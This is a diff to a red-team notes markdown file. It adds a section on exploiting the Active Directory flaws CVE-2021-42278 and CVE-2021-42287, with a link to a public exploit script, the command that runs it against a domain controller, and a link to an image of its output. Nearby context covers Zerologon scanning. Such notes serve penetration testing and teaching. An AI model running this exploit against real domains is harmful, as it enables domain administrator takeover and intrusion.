@@ -85,6 +85,15 @@ Download the tool from this link :
 > Go to : Preferences -> Pinging -> select Combained (UDP/TCP)
 
 # Lateral Movement and Exploitation
+
+### Exploiting CVE-2021-42278 and CVE-2021-42287
+Download the epxloit script https://github.com/WazeHell/sam-the-admin
+
+```bash
+bash$ python3 sam_the_admin.py "<domain_name>/<username>:<password>" -dc-ip <DC_IP>
+```
+If the AD is vulnerable we will have the following output:
+<img src="https://raw.githubusercontent.com/ihebski/A-Red-Teamer-diaries/master/zerologon/1639322935010.jpeg" alt="AD exploit">
 ### Scanning for Zerologon
 SecuraBV zerologon scanner https://github.com/SecuraBV/CVE-2020-1472<br>
 We can use crackmapexec to extract the DC name
